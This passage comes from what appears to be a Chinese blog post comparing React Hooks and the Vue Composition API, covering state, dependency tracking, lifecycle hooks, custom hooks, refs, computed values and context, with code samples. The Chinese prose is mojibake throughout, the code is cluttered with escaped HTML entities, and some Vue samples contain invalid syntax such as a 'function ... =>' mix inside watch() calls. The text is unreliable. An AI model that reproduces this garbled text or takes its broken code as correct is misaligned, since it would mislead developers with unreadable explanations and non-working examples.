å¹¶æ²¡æœ‰è®©åŸæ¥çš„ APIï¼ˆç°åœ¨è¢«ç§°ä½œ \u0026ldquo;Options-based API\u0026rdquo;ï¼‰æ¶ˆå¤±ã€‚å…è®¸å¼€å‘è€… ç»“åˆä½¿ç”¨æ–°æ—§ä¸¤ç§ APIsã€‚å¯ä»¥åœ¨ Vue 2.x ä¸­é€šè¿‡ @vue/composition-api æ’ä»¶å°è¯•æ–° API\nä¾‹å­ï¼š\n\u0026lt;template\u0026gt; \u0026lt;form @submit=\u0026#34;handleSubmit\u0026#34;\u0026gt; \u0026lt;label\u0026gt; \u0026lt;span\u0026gt;Note:\u0026lt;/span\u0026gt; \u0026lt;input v-model=\u0026#34;currentNote\u0026#34; @input=\u0026#34;handleNoteInput\u0026#34;\u0026gt; \u0026lt;/label\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;Send\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import { ref, watch } from \u0026#34;vue\u0026#34;; export default { props: [\u0026#34;divRef\u0026#34;], setup(props, context) { const currentNote = ref(\u0026#34;\u0026#34;); const handleNoteInput = e =\u0026gt; { const val = e.target.value \u0026amp;\u0026amp; e.target.value.toUpperCase()[0]; const validNotes = [\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;, \u0026#34;D\u0026#34;, \u0026#34;E\u0026#34;, \u0026#34;F\u0026#34;, \u0026#34;G\u0026#34;]; currentNote.value = validNotes.includes(val) ? val : \u0026#34;\u0026#34;; }; const handleSubmit = e =\u0026gt; { context.emit(\u0026#34;note-sent\u0026#34;, currentNote.value); currentNote.value = \u0026#34;\u0026#34;; e.preventDefault(); }; return { currentNote, handleNoteInput, handleSubmit, }; } }; \u0026lt;/script\u0026gt; å·®åˆ« åŸç† React hook åº•å±‚æ˜¯åŸºäºé“¾è¡¨å®ç°ï¼Œè°ƒç”¨çš„æ¡ä»¶æ˜¯æ¯æ¬¡ç»„ä»¶è¢«renderçš„æ—¶å€™éƒ½ä¼šé¡ºåºæ‰§è¡Œæ‰€æœ‰çš„hooksï¼Œæ‰€ä»¥ä¸‹é¢çš„ä»£ç ä¼šæŠ¥é”™\nfunction App(){ const [name, setName] = useState(\u0026#39;demo\u0026#39;); if(condition){ const [val, setVal] = useState(\u0026#39;\u0026#39;); } } å› ä¸ºåº•å±‚æ˜¯é“¾è¡¨ï¼Œæ¯ä¸€ä¸ªhookçš„nextæ˜¯æŒ‡å‘ä¸‹ä¸€ä¸ªhookçš„ï¼Œifä¼šå¯¼è‡´é¡ºåºä¸æ­£ç¡®ï¼Œä»è€Œå¯¼è‡´æŠ¥é”™ï¼Œæ‰€ä»¥reactæ˜¯ä¸å…è®¸è¿™æ ·ä½¿ç”¨hookçš„ã€‚\nvue hook åªä¼šè¢«æ³¨å†Œè°ƒç”¨ä¸€æ¬¡ï¼Œvue èƒ½é¿å¼€è¿™äº›éº»çƒ¦çš„é—®é¢˜ï¼ŒåŸå› åœ¨äºå®ƒå¯¹æ•°æ®çš„å“åº”æ˜¯åŸºäºproxyçš„ï¼Œå¯¹æ•°æ®ç›´æ¥ä»£ç†è§‚å¯Ÿã€‚è¿™ç§åœºæ™¯ä¸‹ï¼Œåªè¦ä»»ä½•ä¸€ä¸ªæ›´æ”¹dataçš„åœ°æ–¹ï¼Œç›¸å…³çš„functionæˆ–è€…templateéƒ½ä¼šè¢«é‡æ–°è®¡ç®—ï¼Œå› æ­¤é¿å¼€äº†reactå¯èƒ½é‡åˆ°çš„æ€§èƒ½ä¸Šçš„é—®é¢˜\nreactæ•°æ®æ›´æ”¹çš„æ—¶å€™ï¼Œä¼šå¯¼è‡´é‡æ–°renderï¼Œé‡æ–°renderåˆä¼šé‡æ–°æŠŠhooksé‡æ–°æ³¨å†Œä¸€æ¬¡ï¼Œæ‰€ä»¥reactçš„ä¸Šæ‰‹éš¾åº¦æ›´é«˜ä¸€äº›\nå½“ç„¶reactå¯¹è¿™äº›éƒ½æœ‰è‡ªå·±çš„è§£å†³æ–¹æ¡ˆï¼Œæ¯”å¦‚useCallbackï¼ŒuseMemoç­‰hookçš„ä½œç”¨ï¼Œè¿™äº›å®˜ç½‘éƒ½æœ‰ä»‹ç»\nä»£ç çš„æ‰§è¡Œ Vue ä¸­ï¼Œâ€œé’©å­â€å°±æ˜¯ä¸€ä¸ªç”Ÿå‘½å‘¨æœŸæ–¹æ³• Vue Composition API çš„Â setup()Â æ™šäºÂ beforeCreateÂ é’©å­ï¼Œæ—©äºÂ createdÂ é’©å­è¢«è°ƒç”¨ React hooks ä¼šåœ¨ç»„ä»¶æ¯æ¬¡æ¸²æŸ“æ—¶å€™è¿è¡Œï¼Œè€Œ VueÂ setup()Â åªåœ¨ç»„ä»¶åˆ›å»ºæ—¶è¿è¡Œä¸€æ¬¡ ç”±äº React hooks ä¼šå¤šæ¬¡è¿è¡Œï¼Œæ‰€ä»¥ render æ–¹æ³•å¿…é¡»éµå®ˆæŸäº›è§„åˆ™ï¼Œæ¯”å¦‚: ä¸è¦åœ¨å¾ªç¯å†…éƒ¨ã€æ¡ä»¶è¯­å¥ä¸­æˆ–åµŒå¥—å‡½æ•°é‡Œè°ƒç”¨ Hooks\n// React æ–‡æ¡£ä¸­çš„ç¤ºä¾‹ä»£ç ï¼š function Form() { // 1. Use the name state variable const [name, setName] = useState(\u0026#39;Mary\u0026#39;); // 2. Use an effect for persisting the form if (name !== \u0026#39;\u0026#39;) { useEffect(function persistForm() { localStorage.setItem(\u0026#39;formData\u0026#39;, name); }); } // 3. Use the surname state variable const [surname, setSurname] = useState(\u0026#39;Poppins\u0026#39;); // 4. Use an effect for updating the title useEffect(function updateTitle() { document.title = `${name} ${surname}`; }); // ... } å¦‚æœæƒ³è¦åœ¨ name ä¸ºç©ºæ—¶ä¹Ÿè¿è¡Œå¯¹åº”çš„å‰¯ä½œç”¨, å¯ä»¥ç®€å•çš„å°†æ¡ä»¶åˆ¤æ–­è¯­å¥ç§»å…¥ useEffect å›è°ƒå†…éƒ¨ï¼š\nuseEffect(function persistForm() { if (name !== \u0026#39;\u0026#39;) { localStorage.setItem(\u0026#39;formData\u0026#39;, name); } }); å¯¹äºä»¥ä¸Šçš„å®ç°ï¼ŒVue å†™æ³•å¦‚ä¸‹ï¼š\nexport default { setup() { // 1. Use the name state variable const name = ref(\u0026#34;Mary\u0026#34;); // 2. Use a watcher for persisting the form if(name.value !== \u0026#39;\u0026#39;) { watch(function persistForm() =\u0026gt; { localStorage.setItem(\u0026#39;formData\u0026#39;, name.value); }); } // 3. Use the surname state variable const surname = ref(\u0026#34;Poppins\u0026#34;); // 4. Use a watcher for updating the title watch(function updateTitle() { document.title = `${name.value} ${surname.value}`; }); } } Vue ä¸­ setup() åªä¼šè¿è¡Œä¸€æ¬¡ï¼Œå¯ä»¥å°† Composition API ä¸­ä¸åŒçš„å‡½æ•° (reactiveã€refã€computedã€watchã€ç”Ÿå‘½å‘¨æœŸé’©å­ç­‰) ä½œä¸ºå¾ªç¯æˆ–æ¡ä»¶è¯­å¥çš„ä¸€éƒ¨åˆ†\nä½† if è¯­å¥ å’Œ react hooks ä¸€æ ·åªè¿è¡Œä¸€æ¬¡ï¼Œæ‰€ä»¥å®ƒåœ¨ name æ”¹å˜æ—¶ä¹Ÿæ— æ³•ä½œå‡ºååº”ï¼Œé™¤éæˆ‘ä»¬å°†å…¶åŒ…å«åœ¨ watch å›è°ƒçš„å†…éƒ¨\nwatch(function persistForm() =\u0026gt; { if(name.value !== \u0026#39;\u0026#39;) { localStorage.setItem(\u0026#39;formData\u0026#39;, name.value); } }); å£°æ˜çŠ¶æ€(Declaring state) react useState æ˜¯ React Hooks å£°æ˜çŠ¶æ€çš„ä¸»è¦é€”å¾„\nå¯ä»¥å‘è°ƒç”¨ä¸­ä¼ å…¥ä¸€ä¸ªåˆå§‹å€¼ä½œä¸ºå‚æ•° å¦‚æœåˆå§‹å€¼çš„è®¡ç®—ä»£ä»·æ¯”è¾ƒæ˜‚è´µï¼Œä¹Ÿå¯ä»¥å°†å…¶è¡¨è¾¾ä¸ºä¸€ä¸ªå‡½æ•°ï¼Œå°±åªä¼šåœ¨åˆæ¬¡æ¸²æŸ“æ—¶æ‰ä¼šè¢«æ‰§è¡Œ useState() è¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œç¬¬ä¸€é¡¹æ˜¯ stateï¼Œç¬¬äºŒé¡¹æ˜¯ä¸€ä¸ª setter å‡½æ•°\nconst [name, setName] = useState(\u0026#34;Mary\u0026#34;); const [age, setAge] = useState(25); console.log(`${name} is ${age} years old.`); useReducer æ˜¯ä¸ªæœ‰ç”¨çš„æ›¿ä»£é€‰æ‹©ï¼Œå…¶å¸¸è§å½¢å¼æ˜¯æ¥å—ä¸€ä¸ª Redux æ ·å¼çš„ reducer å‡½æ•°å’Œä¸€ä¸ªåˆå§‹çŠ¶æ€ï¼š\nconst initialState = {count: 0}; function reducer(state, action) { switch (action.type) { case \u0026#39;increment\u0026#39;: return {count: state.count + 1}; case \u0026#39;decrement\u0026#39;: return {count: state.count - 1}; default: throw new Error(); } } const [state, dispatch] = useReducer(reducer, initialState); dispatch({type: \u0026#39;increment\u0026#39;}); // stateÂ å°±ä¼šå˜ä¸ºÂ {count: 1} useReducerÂ è¿˜æœ‰ä¸€ç§Â å»¶è¿Ÿåˆå§‹åŒ–Â çš„å½¢å¼ï¼Œä¼ å…¥ä¸€ä¸ª init å‡½æ•°ä½œä¸ºç¬¬ä¸‰ä¸ªå‚æ•°\nVue Vue ä½¿ç”¨ä¸¤ä¸ªä¸»è¦çš„å‡½æ•°æ¥å£°æ˜çŠ¶æ€ï¼šrefÂ å’ŒÂ reactiveã€‚\nref()Â è¿”å›ä¸€ä¸ªååº”å¼å¯¹è±¡ï¼Œå…¶å†…éƒ¨å€¼å¯é€šè¿‡å…¶Â valueÂ å±æ€§è¢«è®¿é—®åˆ°ã€‚å¯ä»¥å°†å…¶ç”¨äºåŸºæœ¬ç±»å‹ï¼Œä¹Ÿå¯ä»¥ç”¨äºå¯¹è±¡\nconst name = ref(\u0026#34;Mary\u0026#34;); const age = ref(25); watch(() =\u0026gt; { console.log(`${name.value} is ${age.value} years old.`); }); reactive() åªå°†ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå…¶è¾“å…¥å¹¶è¿”å›ä¸€ä¸ªå¯¹å…¶çš„ååº”å¼ä»£ç†\nconst state = reactive({ name: \u0026#34;Mary\u0026#34;, age: 25, }); watch(() =\u0026gt; { console.log(`${state.name} is ${state.age} years old.`); }); æ³¨æ„ï¼š\nä½¿ç”¨Â refÂ æ—¶éœ€è¦ ç”¨Â valueÂ å±æ€§è®¿é—®å…¶åŒ…å«çš„å€¼ï¼ˆé™¤éåœ¨ template ä¸­ï¼ŒVue å…è®¸ä½ çœç•¥å®ƒï¼‰ ç”¨Â reactiveÂ æ—¶ï¼Œè¦æ³¨æ„å¦‚æœä½¿ç”¨äº†å¯¹è±¡è§£æ„ï¼ˆdestructureï¼‰ï¼Œä¼šå¤±å»å…¶ååº”æ€§ã€‚æ‰€ä»¥éœ€è¦å®šä¹‰ä¸€ä¸ªæŒ‡å‘å¯¹è±¡çš„å¼•ç”¨ï¼Œå¹¶é€šè¿‡å…¶è®¿é—®çŠ¶æ€å±æ€§ã€‚ æ€»ç»“ä½¿ç”¨è¿™ä¸¤ä¸ªå‡½æ•°çš„å¤„ç†æ–¹å¼ï¼š\nåƒåœ¨æ­£å¸¸çš„ JavaScript ä¸­å£°æ˜åŸºæœ¬ç±»å‹å˜é‡å’Œå¯¹è±¡å˜é‡é‚£æ ·å»ä½¿ç”¨Â refÂ å’ŒÂ reactiveÂ å³å¯ åªè¦ç”¨åˆ°Â reactiveÂ çš„æ—¶å€™ï¼Œè¦è®°ä½ä» composition å‡½æ•°ä¸­è¿”å›ååº”å¼å¯¹è±¡æ—¶å¾—ä½¿ç”¨Â toRefs()ã€‚è¿™æ ·åšå‡å°‘äº†è¿‡å¤šä½¿ç”¨Â refÂ æ—¶çš„å¼€é”€ // toRefs() åˆ™å°†ååº”å¼å¯¹è±¡è½¬æ¢ä¸ºæ™®é€šå¯¹è±¡ï¼Œè¯¥å¯¹è±¡ä¸Šçš„æ‰€æœ‰å±æ€§éƒ½è‡ªåŠ¨è½¬æ¢ä¸º ref function useFeatureX() { const state = reactive({ foo: 1, bar: 2 }) return toRefs(state) } const {foo, bar} = useFeatureX(); å¦‚ä½•è·Ÿè¸ªä¾èµ–(How to track dependencies) React ä¸­çš„Â useEffectÂ hook å…è®¸åœ¨æ¯æ¬¡æ¸²æŸ“ä¹‹åè¿è¡ŒæŸäº›å‰¯ä½œç”¨ï¼ˆå¦‚è¯·æ±‚æ•°æ®æˆ–ä½¿ç”¨ storage ç­‰ Web APIsï¼‰ï¼Œå¹¶åœ¨ä¸‹æ¬¡æ‰§è¡Œå›è°ƒä¹‹å‰æˆ–å½“ç»„ä»¶å¸è½½æ—¶è¿è¡Œä¸€äº›æ¸…ç†å·¥ä½œ\né»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰ç”¨Â useEffectÂ æ³¨å†Œçš„å‡½æ•°éƒ½ä¼šåœ¨æ¯æ¬¡æ¸²æŸ“ä¹‹åè¿è¡Œï¼Œä½†å¯ä»¥å®šä¹‰çœŸå®ä¾èµ–çš„çŠ¶æ€å’Œå±æ€§ï¼Œä»¥ä½¿ React åœ¨ç›¸å…³ä¾èµ–æ²¡æœ‰æ”¹å˜çš„æƒ…å†µä¸‹ï¼ˆå¦‚ç”± state ä¸­çš„å…¶ä»–éƒ¨åˆ†å¼•èµ·çš„æ¸²æŸ“ï¼‰è·³è¿‡æŸäº›Â useEffectÂ hook æ‰§è¡Œ\n// ä¼ é€’ä¸€ä¸ªä¾èµ–é¡¹çš„æ•°ç»„ä½œä¸ºÂ useEffectÂ hook çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œåªæœ‰å½“Â nameÂ æ”¹å˜æ—¶æ‰ä¼šæ›´æ–°Â localStorage function Form() { const [name, setName] = useState(\u0026#39;Mary\u0026#39;); const [surname, setSurname] = useState(\u0026#39;Poppins\u0026#39;); useEffect(function persistForm() { localStorage.setItem(\u0026#39;formData\u0026#39;, name); }, [name]); // ... } æ˜¾ç„¶ï¼Œä½¿ç”¨ React Hooks æ—¶å¿˜è®°åœ¨ä¾èµ–é¡¹æ•°ç»„ä¸­è¯¦å°½åœ°å£°æ˜æ‰€æœ‰ä¾èµ–é¡¹å¾ˆå®¹æ˜“å‘ç”Ÿï¼Œä¼šå¯¼è‡´Â useEffectÂ å›è°ƒ \u0026ldquo;ä»¥ä¾èµ–å’Œå¼•ç”¨äº†ä¸Šä¸€æ¬¡æ¸²æŸ“çš„é™ˆæ—§æ•°æ®è€Œéæœ€æ–°æ•°æ®\u0026rdquo; ä»è€Œæ— æ³•è¢«æ›´æ–°è€Œå‘Šç»ˆ\nè§£å†³æ–¹æ¡ˆï¼š\neslint-plugin-react-hooksÂ åŒ…å«äº†ä¸€æ¡ lint æç¤ºå…³äºä¸¢å¤±ä¾èµ–é¡¹çš„è§„åˆ™ useCallbackÂ å’ŒÂ useMemoÂ ä¹Ÿä½¿ç”¨ä¾èµ–é¡¹æ•°ç»„å‚æ•°ï¼Œä»¥åˆ†åˆ«å†³å®šå…¶æ˜¯å¦åº”è¯¥è¿”å›ç¼“å­˜è¿‡çš„ï¼ˆ memoizedï¼‰ä¸ä¸Šä¸€æ¬¡æ‰§è¡Œç›¸åŒçš„ç‰ˆæœ¬çš„å›è°ƒæˆ–å€¼ã€‚ åœ¨ Vue Composition API çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨Â watch()Â æ‰§è¡Œå‰¯ä½œç”¨ä»¥å“åº”çŠ¶æ€æˆ–å±æ€§çš„æ”¹å˜ã€‚ä¾èµ–ä¼šè¢«è‡ªåŠ¨è·Ÿè¸ªï¼Œæ³¨å†Œè¿‡çš„å‡½æ•°ä¹Ÿä¼šåœ¨ä¾èµ–æ”¹å˜æ—¶è¢«ååº”æ€§çš„è°ƒç”¨\nexport default { setup() { const name = ref(\u0026#34;Mary\u0026#34;); const lastName = ref(\u0026#34;Poppins\u0026#34;); watch(function persistForm() =\u0026gt; { localStorage.setItem(\u0026#39;formData\u0026#39;, name.value); }); } } è®¿é—®ç»„ä»¶ç”Ÿå‘½å‘¨æœŸ(Access to the lifecycle of the component) Hooks åœ¨å¤„ç† React ç»„ä»¶çš„ç”Ÿå‘½å‘¨æœŸã€å‰¯ä½œç”¨å’ŒçŠ¶æ€ç®¡ç†æ—¶è¡¨ç°å‡ºäº†å¿ƒç†æ¨¡å¼ä¸Šçš„å®Œå…¨è½¬å˜ã€‚ React æ–‡æ¡£ä¸­ä¹ŸæŒ‡å‡ºï¼š\nå¦‚æœä½ ç†Ÿæ‚‰ React ç±»ç”Ÿå‘½å‘¨æœŸæ–¹æ³•ï¼Œé‚£ä¹ˆå¯ä»¥å°† useEffect Hook è§†ä¸º componentDidMountã€componentDidUpdate åŠ componentWillUnmount çš„åˆé›†\nuseEffect(() =\u0026gt; { console.log(\u0026#34;This will only run after initial render.\u0026#34;); return () =\u0026gt; { console.log(\u0026#34;This will only run when component will unmount.\u0026#34;); }; }, []); å¼ºè°ƒçš„æ˜¯ï¼Œä½¿ç”¨ React Hooks æ—¶åœæ­¢ä»ç”Ÿå‘½å‘¨æœŸæ–¹æ³•çš„è§’åº¦æ€è€ƒï¼Œè€Œæ˜¯è€ƒè™‘å‰¯ä½œç”¨ä¾èµ–ä»€ä¹ˆçŠ¶æ€ï¼Œæ‰æ›´ç¬¦åˆä¹ æƒ¯\nVue Component API é€šè¿‡Â onMountedã€onUpdatedÂ å’ŒÂ onBeforeUnmountï¼š\nsetup() { onMounted(() =\u0026gt; { console.log(`This will only run after initial render.`); }); onBeforeUnmount(() =\u0026gt; { console.log(`This will only run when component will unmount.`); }); } æ•…åœ¨ Vue çš„æƒ…å†µä¸‹çš„å¿ƒç†æ¨¡å¼è½¬å˜æ›´å¤šåœ¨åœæ­¢é€šè¿‡ç»„ä»¶é€‰é¡¹ï¼ˆdataã€computed, watchã€methodsã€ç”Ÿå‘½å‘¨æœŸé’©å­ç­‰ï¼‰ç®¡ç†ä»£ç ï¼Œè¦è½¬å‘ç”¨ä¸åŒå‡½æ•°å¤„ç†å¯¹åº”çš„ç‰¹æ€§\nè‡ªå®šä¹‰ä»£ç (Custom code) React å›¢é˜Ÿèšç„¦äº Hooks ä¸Šçš„åŸå› ä¹‹ä¸€ï¼ŒCustom Hooks æ˜¯å¯ä»¥æ›¿ä»£ä¹‹å‰ç¤¾åŒºä¸­é‡‡çº³çš„è¯¸å¦‚Â Higher-Order ComponentsÂ æˆ–Â Render PropsÂ ç­‰æä¾›ç»™å¼€å‘è€…ç¼–å†™å¯å¤ç”¨ä»£ç çš„ï¼Œä¸€ç§æ›´ä¼˜ç§€çš„æ–¹å¼\nCustom Hooks å°±æ˜¯æ™®é€šçš„ JavaScript å‡½æ•°ï¼Œåœ¨å…¶å†…éƒ¨åˆ©ç”¨äº† React Hooksã€‚å®ƒéµå®ˆçš„ä¸€ä¸ªçº¦å®šæ˜¯å…¶å‘½ååº”è¯¥ä»¥Â useÂ å¼€å¤´ï¼Œä»¥æ˜ç¤ºè¿™æ˜¯è¢«ç”¨ä½œä¸€ä¸ª hook çš„ã€‚\n// custom hook - ç”¨äºå½“ value æ”¹å˜æ—¶å‘æ§åˆ¶å°æ‰“å°æ—¥å¿— export function useDebugState(label, initialValue) { const [value, setValue] = useState(initialValue); useEffect(() =\u0026gt; { console.log(`${label}: `, value); }, [label, value]); return [value, setValue]; } // è°ƒç”¨ const [name, setName] = useDebugState(\u0026#34;Name\u0026#34;, \u0026#34;Mary\u0026#34;); Vue ä¸­ï¼Œç»„åˆå¼å‡½æ•°ï¼ˆComposition Functionsï¼‰ä¸ Hooks åœ¨é€»è¾‘æå–å’Œé‡ç”¨çš„ç›®æ ‡ä¸Šæ˜¯ä¸€è‡´çš„åœ¨ Vue ä¸­å®ç°ä¸€ä¸ªç±»ä¼¼çš„ useDebugState ç»„åˆå¼å‡½æ•°\nexport function useDebugState(label, initialValue) { const state = ref(initialValue); watch(() =\u0026gt; { console.log(`${label}: `, state.value); }); return state; } // elsewhere: const name = useDebugState(\u0026#34;Name\u0026#34;, \u0026#34;Mary\u0026#34;); æ³¨æ„ï¼šæ ¹æ®çº¦å®šï¼Œç»„åˆå¼å‡½æ•°ä¹Ÿåƒ React Hooks ä¸€æ ·ä½¿ç”¨ use ä½œä¸ºå‰ç¼€ä»¥æ˜ç¤ºä½œç”¨ï¼Œå¹¶ä¸”è¡¨é¢è¯¥å‡½æ•°ç”¨äº setup() ä¸­\nRefs React çš„ useRef å’Œ Vue çš„ ref éƒ½å…è®¸ä½ å¼•ç”¨ä¸€ä¸ªå­ç»„ä»¶ æˆ– è¦é™„åŠ åˆ°çš„ DOM å…ƒç´ ã€‚\nReactï¼š\nconst MyComponent = () =\u0026gt; { const divRef = useRef(null); useEffect(() =\u0026gt; { console.log(\u0026#34;div: \u0026#34;, divRef.current) }, [divRef]); return ( \u0026lt;div ref={divRef}\u0026gt; \u0026lt;p\u0026gt;My div\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; ) } Vue:\nexport default { setup() { const divRef = ref(null); onMounted(() =\u0026gt; { console.log(\u0026#34;div: \u0026#34;, divRef.value); }); return () =\u0026gt; ( \u0026lt;div ref={divRef}\u0026gt; \u0026lt;p\u0026gt;My div\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; ) } } é™„åŠ çš„å‡½æ•°(Additional functions) React Hooks åœ¨æ¯æ¬¡æ¸²æŸ“æ—¶éƒ½ä¼šè¿è¡Œï¼Œæ²¡æœ‰ ä¸€ä¸ªç­‰ä»·äº Vue ä¸­ computed å‡½æ•°çš„æ–¹æ³•ã€‚æ‰€ä»¥ä½ å¯ä»¥è‡ªç”±åœ°å£°æ˜ä¸€ä¸ªå˜é‡ï¼Œå…¶å€¼åŸºäºçŠ¶æ€æˆ–å±æ€§ï¼Œå¹¶å°†æŒ‡å‘æ¯æ¬¡æ¸²æŸ“åçš„æœ€æ–°å€¼ï¼š\nconst [name, setName] = useState(\u0026#34;Mary\u0026#34;); const [age, setAge] = useState(25); const description = `${name} is ${age} years old`; Vue ä¸­ï¼Œsetup() åªè¿è¡Œä¸€æ¬¡ã€‚å› æ­¤éœ€è¦å®šä¹‰è®¡ç®—å±æ€§ï¼Œå…¶åº”è¯¥è§‚å¯ŸæŸäº›çŠ¶æ€æ›´æ”¹å¹¶ä½œå‡ºç›¸åº”çš„æ›´æ–°ï¼š\nconst name = ref(\u0026#34;Mary\u0026#34;); const age = ref(25); const description = computed(() =\u0026gt; `${name.value} is ${age.value} years old`); è®¡ç®—ä¸€ä¸ªå€¼å¼€é”€æ¯”è¾ƒæ˜‚è´µã€‚ä½ ä¸ä¼šæƒ³åœ¨ç»„ä»¶æ¯æ¬¡æ¸²æŸ“æ—¶éƒ½è®¡ç®—å®ƒã€‚React åŒ…å«äº†é’ˆå¯¹è¿™ç‚¹çš„ useMemo hookï¼š\nfunction fibNaive(n) { if (n \u0026lt;= 1) return n; return fibNaive(n - 1) + fibNaive(n - 2); } const Fibonacci = () =\u0026gt; { const [nth, setNth] = useState(1); const nthFibonacci = useMemo(() =\u0026gt; fibNaive(nth), [nth]); return ( \u0026lt;section\u0026gt; \u0026lt;label\u0026gt; Number: \u0026lt;input type=\u0026#34;number\u0026#34; value={nth} onChange={e =\u0026gt; setNth(e.target.value)} /\u0026gt; \u0026lt;/label\u0026gt; \u0026lt;p\u0026gt;nth Fibonacci number: {nthFibonacci}\u0026lt;/p\u0026gt; \u0026lt;/section\u0026gt; ); }; React å»ºè®®ä½ ä½¿ç”¨Â useMemoÂ ä½œä¸ºä¸€ä¸ªæ€§èƒ½ä¼˜åŒ–æ‰‹æ®µ, è€Œéä¸€ä¸ªä»»ä½•ä¸€ä¸ªä¾èµ–é¡¹æ”¹å˜ä¹‹å‰çš„ç¼“å­˜å€¼\nReact advice you to use useMemo as a performance optimization and not as a guarantee that the value will remain memoized\nVue çš„Â computedÂ æ‰§è¡Œè‡ªåŠ¨çš„ä¾èµ–è¿½è¸ªï¼Œæ‰€ä»¥å®ƒä¸éœ€è¦ä¸€ä¸ªä¾èµ–é¡¹æ•°ç»„\nContext å’Œ provide/inject React ä¸­çš„Â useContextÂ hookï¼Œå¯ä»¥ä½œä¸ºä¸€ç§è¯»å–ç‰¹å®šä¸Šä¸‹æ–‡å½“å‰å€¼çš„æ–°æ–¹å¼ã€‚è¿”å›çš„å€¼é€šå¸¸ç”±æœ€é è¿‘çš„ä¸€å±‚Â \u0026lt;MyContext.Provider\u0026gt;Â ç¥–å…ˆæ ‘çš„Â valueÂ å±æ€§ç¡®å®š\n// context object const ThemeContext = React.createContext(\u0026#39;light\u0026#39;); // provider \u0026lt;ThemeContext.Provider value=\u0026#34;dark\u0026#34;\u0026gt; // consumer const theme = useContext(ThemeContext); Vue ä¸­ç±»ä¼¼çš„ API å« provide/injectã€‚åœ¨ Vue 2.x ä¸­ä½œä¸ºç»„ä»¶é€‰é¡¹å­˜åœ¨ï¼Œåœ¨ Composition API ä¸­å¢åŠ äº†ä¸€å¯¹ç”¨åœ¨ setup() ä¸­çš„ provide å’Œ inject å‡½æ•°ï¼š\n// key to provide const ThemeSymbol = Symbol(); // provider provide(ThemeSymbol, ref(\u0026#34;dark\u0026#34;)); // consumer const value = inject(ThemeSymbol); å¦‚æœä½ æƒ³ä¿æŒååº”æ€§ï¼Œå¿…é¡»æ˜ç¡®æä¾›ä¸€ä¸ª ref/reactive ä½œä¸ºå€¼\nåœ¨æ¸²æŸ“ä¸Šä¸‹æ–‡ä¸­æš´éœ²å€¼(Exposing values to render context) åœ¨ React çš„æƒ…å†µä¸‹ æ‰€æœ‰ hooks ä»£ç éƒ½åœ¨ç»„ä»¶ä¸­å®šä¹‰ ä¸”ä½ å°†åœ¨åŒä¸€ä¸ªå‡½æ•°ä¸­è¿”å›è¦æ¸²æŸ“çš„ React å…ƒç´  æ‰€ä»¥ä½ å¯¹ä½œç”¨åŸŸä¸­çš„ä»»ä½•å€¼æ‹¥æœ‰å®Œå…¨è®¿é—®èƒ½åŠ›ï¼Œå°±åƒåœ¨ä»»ä½• JavaScript ä»£ç ä¸­çš„ä¸€æ ·ï¼š\nconst Fibonacci = () =\u0026gt; { const [nth, setNth] = useState(1); const nthFibonacci = useMemo(() =\u0026gt; fibNaive(nth), [nth]); return ( \u0026lt;section\u0026gt; \u0026lt;label\u0026gt; Number: \u0026lt;input type=\u0026#34;number\u0026#34; value={nth} onChange={e =\u0026gt; setNth(e.target.value)} /\u0026gt; \u0026lt;/label\u0026gt; \u0026lt;p\u0026gt;nth Fibonacci number: {nthFibonacci}\u0026lt;/p\u0026gt; \u0026lt;/section\u0026gt; ); }; Vue çš„æƒ…å†µä¸‹ ç¬¬ä¸€ï¼Œåœ¨Â templateÂ æˆ–Â renderÂ é€‰é¡¹ä¸­å®šä¹‰æ¨¡æ¿ ç¬¬äºŒï¼Œä½¿ç”¨å•æ–‡ä»¶ç»„ä»¶ï¼Œå°±è¦ä»Â setup()Â ä¸­è¿”å›ä¸€ä¸ªåŒ…å«äº†ä½ æƒ³è¾“å‡ºåˆ°æ¨¡æ¿ä¸­çš„æ‰€æœ‰å€¼çš„å¯¹è±¡ ç”±äºè¦æš´éœ²çš„å€¼å¾ˆå¯èƒ½è¿‡å¤šï¼Œè¿”å›è¯­å¥ä¹Ÿå®¹æ˜“å˜å¾—å†—é•¿\n\u0026lt;template\u0026gt; \u0026lt;section\u0026gt; \u0026lt;label\u0026gt; Number: \u0026lt;input type=\u0026#34;number\u0026#34; v-model=\u0026#34;nth\u0026#34; /\u0026gt; \u0026lt;/label\u0026gt; \u0026lt;p\u0026gt;nth Fibonacci number: {{nthFibonacci}}\u0026lt;/p\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default { setup() { const nth = ref(1); const nthFibonacci = computed(() =\u0026gt; fibNaive(nth.value)); return { nth, nthFibonacci }; } }; \u0026lt;/script\u0026gt; } è¦è¾¾åˆ° React åŒæ ·ç®€æ´è¡¨ç°çš„ä¸€ç§æ–¹å¼æ˜¯ä» setup() è‡ªèº«ä¸­è¿”å›ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ã€‚ä¸è¿‡ï¼Œæ¨¡æ¿åœ¨ Vue ä¸­æ˜¯æ›´å¸¸ç”¨çš„ä¸€ç§åšæ³•ï¼Œæ‰€ä»¥æš´éœ²ä¸€ä¸ªåŒ…å«å€¼çš„å¯¹è±¡ï¼Œæ˜¯ä½ ä½¿ç”¨ Vue Composition API æ—¶å¿…ç„¶ä¼šå¤šå¤šé­é‡çš„æƒ…å†µã€‚\næ€»ç»“(Conclusion) React å’Œ Vueéƒ½æœ‰å±äºå±äºè‡ªå·±çš„â€œæƒŠå–œâ€ï¼Œæ— ä¼˜åŠ£ä¹‹åˆ†ï¼Œè‡ª React Hooks åœ¨ 2018 å¹´è¢«å¼•å…¥ï¼Œç¤¾åŒºåˆ©ç”¨å…¶äº§å‡ºäº†å¾ˆå¤šä¼˜ç§€çš„ä½œå“ï¼Œè‡ªå®šä¹‰ Hooks çš„å¯æ‰©å±•æ€§ä¹Ÿå‚¬ç”Ÿäº†è®¸å¤šå¼€æºè´¡çŒ®ã€‚\nVue å— React Hooks 